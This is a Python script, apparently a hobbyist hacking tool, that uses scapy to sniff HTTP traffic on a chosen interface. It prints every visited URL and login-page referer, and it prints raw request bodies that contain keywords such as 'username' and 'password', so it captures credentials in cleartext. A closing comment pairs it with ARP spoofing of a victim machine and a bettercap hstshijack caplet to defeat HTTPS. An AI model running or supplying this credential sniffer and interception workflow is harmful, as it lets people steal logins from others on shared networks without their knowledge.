import scapy.all as scapy
from scapy.layers import http
import optparse


def interface():
    i_face = optparse.OptionParser()
    i_face.add_option("-i", "--iface", dest="interface",
                      help="Enter the interface on which you want to scan like wlan0, eth0")
    (options, agruments) = i_face.parse_args()

    if not options.interface:
        print("Enter the interface to scan --help for more")

    return options.interface


def sniff_data(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
    # filter can be used to filter the packets but can noty be used for HTTP packets. It takes udp, tcp, arp, port 21 or port 34 any port also can be filter from all the sinff packets


def get_url(sniff_packet):
    return sniff_packet[http.HTTPRequest].Host + sniff_packet[http.HTTPRequest].Path
    # print(sniff_packet.show())


def get_login_url(sniff_packet):
    website_reffer = sniff_packet[http.HTTPRequest].Referer
    website_keywords = [".", "http", "https", "www"]
    for w_keyword in website_keywords:
        if w_keyword in str(website_reffer):
            return website_reffer
            # print(sniff_packet.show())


def get_user_pass(sniff_packet):
    if sniff_packet.haslayer(scapy.Raw):
        load = sniff_packet[scapy.Raw].load
        username_pass_keywords = ["uname", "&pass", "username", "password", "login"]
        for keyword in username_pass_keywords:
            if keyword in str(load):
                return load


def process_sniffed_packet(sniff_packet):
    # Pattern to print any specific data from packet.show()
    # packet.haslayer(layer_name).specific_part_from_layer

    if sniff_packet.haslayer(http.HTTPRequest):
        url = get_url(sniff_packet)
        print("[+] Url -> ", url.decode())

        if get_login_url(sniff_packet):
            login_url = get_login_url(sniff_packet)
            print("\n[+] Login page -> ", login_url.decode())

        if get_user_pass(sniff_packet):
            print("\n[+] User-name and Password -> ", get_user_pass(sniff_packet), "\n")

    # print(packet.show())


try:
    sniff_data(interface())

except KeyboardInterrupt:
    print("[+] Ctrl+C detected")
    print("Quiting")

"""
HTTP ->

remote computer -> ARP spoofing for that computer ip


HTTPS ->

remote computer -> ARP spoofing for that compuet ip
                -> bettercap -iface wlan0 -caplet hstshijack/hstshijack

"""
